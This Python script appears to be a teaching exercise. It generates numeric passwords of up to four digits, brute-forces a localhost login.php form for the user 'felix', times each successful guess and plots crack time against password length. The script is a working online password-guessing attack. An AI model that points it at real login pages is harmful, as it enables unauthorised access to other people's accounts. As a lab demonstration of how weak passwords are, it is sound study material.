import requests
import time
import os
import matplotlib.pyplot as plot

def word_crt():
    """Creating list of passwords"""
    p=str("0")
    x='0'
    f=open("pswd.txt",'w')
    f.write(str(p)+"\n")
    while len(str(p))<=3:
        i=0
        b=True
        while i<len(str(p)):
            if p[i] !='9':
                b=False
                break
            i=i+1
        if b:
            i=0
            x=''
            while i<len(str(p))+1:
                x=x+'0'
                i=i+1
            p=x
            f.write(str(x)+"\n")
        if p[0]!='0':
            p=str(int(p)+1)
        else:
            l=len(p)-1
            while str(p)[l]>='9':
                l=l-1
            if l>0:
                g=len(p)
                p=str(str(p)[0:l]+str(int(p[l])+1))
                while len(p)<g:
                    p=p+"0"
            else:
                p='1'+x[1:len(x)]
        f.write(str(p)+"\n")
    f.close()

def brute():
    """Brute force attack that return timings of post requests"""
    url = "http://localhost:8080/login.php"
    creds = {'user' : 'felix', 'password' : None}
    with open("pswd.txt", "r") as f:
        passwords = f.readlines()
    f.close()
    passwords = [x.strip() for x in passwords]
    now = time.time()
    timings = []
    for idx in range(len(passwords)):
        if len(passwords[idx-1]) < len(passwords[idx]):
            now = time.time()
        creds['password'] = passwords[idx]
        req = requests.post(url, data=creds, timeout=0.4)
        if 'Wrong' not in req.text:
            print("time: {0}; pass: {1}".format(time.time() - now, passwords[idx]))
            timings.append(time.time() - now)
    print(timings)
    return timings


def plt(values, lengths):
    """Creating of graph that shows how time growth with growth of symbols count"""
    plot.plot(values, lengths)
    plot.ylabel('Length of password')
    plot.xlabel('Avg seconds to crack')
    plot.show()

def average(listi):
    """Count average value"""
    return sum(listi) / len(listi)




if __name__ == '__main__':
    lengths = [x for x in range(1, 3)]
    word_crt()
    values = brute()
    print("returned: {}".format(values))
    news = []
    for i in range(0, len(values), 3):
        news.append(average(values[i:i+3]))
    print(news)
    plt(news, lengths)